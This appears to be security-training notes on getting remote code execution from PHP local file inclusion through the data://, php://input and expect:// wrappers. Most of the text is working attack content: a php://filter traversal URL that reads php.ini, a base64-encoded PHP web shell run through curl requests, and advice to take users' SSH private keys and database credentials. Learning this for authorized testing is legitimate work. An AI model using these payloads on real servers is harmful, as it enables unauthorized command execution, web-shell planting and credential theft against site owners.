# PHP Wrappers - RCE
***
#### There are various methods to execute remote commands, depending on the type of technology on the back-end.
#### One of the methods that we can use to achieve RCE is by enumerating user credentials and SSH keys to use them to log in to the server. For instance, we may find the database credentials in a file like `config.php` or by checking the `.ssh` directory in each user's home directory to get their private key (id_rsa) to be able to SSH into the system.

### [Data](https://www.php.net/manual/en/wrappers.data.php)
#### We can include external data by using the `data` wrapper when the `allow_url_include` setting is enabled in the PHP config. By reading the PHP config file through the LFI vulnerability we may be able to check the previous setting.

### Checking PHP Configurations
#### The PHP configuration file can be found at `/etc/php/X.Y/apache2/php.ini` for Apache or `/etc/php/X.Y/fpm/php.ini` for Nginx. The `X.Y` represents the installed PHP version. We may also fuzz the PHP version starting from the earliest one. The `base64` filter should be used as `.ini` files are similar to `.php`and should be encoded to avoid breaking.
#### Example:
```
 http://<IP>:<PORT>/index.php?lang=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

#### Then we would decode the result of the above payload to check if the `allow_url_include` setting is enabled:
```shell
echo 'MTMzNwo=' | base64 -d | grep allow_url_include
```

#### The option mentioned above is not enabled by default, so we need to check that in order to exploit several LFI vulnerabilities, for instance using the `input` wrapper or any RFI vulnerability. However, it is commonly enabled for WordPress plugins and themes.

### Remote Code Execution
#### When the `allow_url_include` option is enabled we may try to use the `data` wrapper to include external data like PHP code. In addition, it is possible to base64 encode our payload with `text/plain;base64` as it has the ability to decode it and execute the PHP script.
#### Steps to execute the attack above:
#### Base64 encode our PHP script:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64
```
#### And then pass it to the data wrapper with `data://text/plain;base64,` and input commands through `&cmd=<COMMAND>`:
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### [Input](https://www.php.net/manual/en/wrappers.php.php)
#### Likewise, the `input` wrapper can be used to include external input and execute PHP code ,and it also needs the `allow_url_include` setting to be switched on . This can be achieved by passing our input to the wrapper as a POST request's data. Consequently, we need to be able to send POST requests for this to work.
#### Example:
```bash
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?lang=php://input&cmd=id" | grep uid
```
#### When we are only able to send a POST request we may send our command directly in our PHP code. For instance `<\?php system('whoami')?>`

### [Expect](https://www.php.net/manual/en/wrappers.expect.php)
#### With the `expect` wrapper we can also achieve RCE by directly running commands through URL streams.
#### This wrapper needs to be installed and enabled on the back-end server, and we can check that by using the previous mentioned method.
```bash
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

#### Then if it is enabled we can use it to pass commands and execute them:
```bash
$  curl -s "http://<SERVER>:<PORT>/index.php?lang=expect://whoami"
```